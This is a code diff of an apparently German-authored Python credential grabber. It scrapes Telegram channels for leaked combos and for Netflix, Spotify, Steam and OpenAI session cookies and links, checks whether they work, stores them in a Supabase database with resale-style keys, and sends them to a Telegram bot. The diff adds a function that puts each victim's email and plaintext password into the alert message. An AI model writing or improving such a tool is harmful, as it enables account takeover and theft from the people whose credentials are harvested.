@@ -38,7 +38,6 @@ TELEGRAM_CHANNELS = [
     "chatgpt_accounts", "openai_accounts", "gaming_drops", "leaked_combos"
 ]
 
-# FEHLER BEHOBEN: Das | ist jetzt INNERHALB der Anführungszeichen
 PATTERN = re.compile(
     r'(https?://(?:www\.)?(?:netflix|spotify|disneyplus|rtlplus|crunchyroll|steam|minecraft|openai|chatgpt)\.(?:com|de|net)/[^\s<"]+)|((?:NetflixId|SecureNetflixId|sp_dc|sp_key|token|session)=[^;\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
     re.IGNORECASE
@@ -60,10 +59,6 @@ def get_platform(item):
     return "combo"
 
 def test_item(item):
-    platform = get_platform(item)
-    if platform == "spotify":
-        return ':' in item and '@' in item
-    
     if ':' in item and '@' in item: return True
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
     try:
@@ -78,6 +73,20 @@ def test_item(item):
                 return True
     except: pass
     return False
+
+def build_telegram_msg(item, platform, key):
+    if ':' in item and '@' in item:
+        email, password = item.split(':', 1)
+        msg = f"🚨 <b>{platform.upper()} LOGIN FUND!</b>\n\n"
+        msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
+        msg += f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
+        msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n"
+    else:
+        msg = f"🚨 <b>{platform.upper()} LINK FUND!</b>\n\n"
+        msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
+        msg += f"🔗 <b>Link:</b> <a href='{item}'>Hier klicken</a>\n"
+        msg += f"<code>{item[:100]}...</code>\n"
+    return msg
 
 def scan_telegram(channel):
     found = []
@@ -106,7 +115,9 @@ def grabber_loop():
                     meta = {"email": "Login" if ':' in item else "Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                     newKey = 'CLM-' + os.urandom(4).hex().upper()
                     requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
-                    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🚨 **NEUER FUND ({platform.upper()})!**\n\n{newKey}", "parse_mode": "Markdown"})
+                    try: 
+                        msg = build_telegram_msg(item, platform, newKey)
+                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
                     except: pass
         time.sleep(60)
 
